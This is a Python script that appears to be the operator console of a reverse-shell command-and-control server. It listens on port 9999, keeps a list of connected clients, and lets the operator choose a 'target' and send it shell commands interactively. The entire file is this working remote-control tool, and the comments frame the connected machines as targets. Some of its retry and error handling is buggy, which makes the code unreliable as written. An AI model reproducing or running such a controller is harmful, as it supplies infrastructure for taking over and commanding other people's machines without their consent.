import socket
import sys
import threading
import time
from queue import Queue
import re

No_Of_Threads = 2
all_connections = []
all_address = []
que = Queue()
threads = [1, 2]




# Creating socket
def create_socket():
    try:
        soc = socket.socket()
        return soc

    except socket.error as msg:
        print("Scoket Creation Error: "+str(msg))


#Close connection
def close_connection():
    if len(all_connections)!=0:
        for connection in all_connections:
            connection.close()
    print("Bye!!!")        
    sys.exit()
    


# Binding the socket and listening for connection

def bind_socket(soc):
   
    try:
        port = 9999 
        host =''
        print("Binding the Port "+str(port))
        soc.bind((host, port))
        # Listening
        soc.listen(5)
    
        
    except socket.error as msg:
        print("Scoket Binding Error: "+str(msg)+"\n"+"Retrying...")
        bind_socket()

# Display all current connection with the client


def list_connection():
    try:    
        results =[]
        if len(all_connections)!=0:
            for i, conn in enumerate(all_connections):
                # try:
                #     # Checking connection is still established or not
                #     conn.send(str.encode(''))
                #     p= conn.recv(65536)
                #     print(p)
                # except:
                #     del all_connections[i]
                #     del all_address[i]
                #     continue
                results.append(str(i+1)+' ' + str(all_address[i][0]) +" port : "+str(all_address[i][1]))
            print("\t\t----Clients----"+"\n")
        if (len(results)!=0):
            for result in results:
                print(result)
            return
        else:
            print("No Client Found!!!\n")     
    except :
       close_connection()     


# Selecting the target


def get_target(cmd):
    try:
        target = re.findall(r"\d",cmd)
        idx = int(target[0])-1
        conn = all_connections[idx]
        print("Connected to "+str(all_address[idx][0]))
        print(str(all_address[idx][0])+">", end="")
        return [conn,idx]

    except:
        print("Selection Invalid!!")
        return None

# Sending commands to clients


def send_target_commands(a):
    con = a[0]
    idx=a[1]
    while True:
        try:
            print(str(all_address[idx][0])+">", end="")
            command = input("")
            command = str(command).lower()
            if ((command =="quit" )or( command == "-q")):
                break
            elif ((command == "-h") or(command == "help")):
                helps(1)
            elif len(str.encode(command)) > 0:
                con.send(str.encode(command))
                client_response = str(con.recv(1024), "utf-8")
                print(client_response, end="")
            else:
                continue
        except:
            print("Error in sending commands")
            break


# Handling connection from multiple clients and saving to a list
# Closing connection when server fie restarted
def accept_connection(soc):
    #Close all previous connection
    for connection in all_connections:
        connection.close()
    #Deleting all items from connections and adresses
    del all_connections[:]
    del all_address[:]

    #Accepting the connection requrest
    while True:
        try:
            conn, addr = soc.accept()
            soc.setblocking(1)  # Prevents timeout
            all_connections.append(conn)
            all_address.append(addr)
            print('Connection has been established : '+addr[0])
            
        except:
            time.sleep(3)
            print("Error in accepting connection")
            
def helps(select):
    if select == 0:
        print("\n\n\t--------Help---------\n")
        print("\n1.show (Lists available connection)\n\n2.use _id_(Selects clients from the list)\n\nExample: use 1\n\n3.help or -h\n\n")
    elif select ==1:
        print("\n\n\t--------Help---------\n")
        print("\n1.q or quit\n\n2.help or -h\n\n")
        



# Interactive prompt for sending commands
def start_shell(): 
    time.sleep(3)
    print("\n\n\t--------Help---------\n")
    print("\n1.show (Lists available connection)\n\n2.use _id_(Selects clients from the list)\n\nExample: use 1\n\n3.quit or -q\n\n")
    while True:
        try:
            command = input('shell>')
            command = command.lower()
            if command == 'show':
                list_connection()
            elif 'use' in command:
                a = get_target(command)
                if a[0] is not None:
                    send_target_commands(a)
            elif ((command  =="-h" )or(command =="help")):
                helps(0)
            elif ((command =="-q" )or(command =="quit")):
                close_connection()
            else:
                print("Command not recognized!!")
        except Exception as e:
            close_connection()
           

# Do next jon that is in the queue
def worker(): 
    while True:
        job = que.get()
        if job == 1:
            soc=create_socket()
            bind_socket(soc)
            accept_connection(soc)
        
        if job == 2:
            start_shell()
      
        que.task_done()

def create_action():
    for i in threads:
        que.put(i)
    # block until all tasks are done
    que.join()
    


# Create No_Of_Threads
def create_thread():
    try:
        for _ in range(No_Of_Threads):
            # turn-on the worker thread
            threading.Thread(target=worker,daemon=True).start()
    except Exception as e:
        close_connection()
              

create_thread()
create_action()





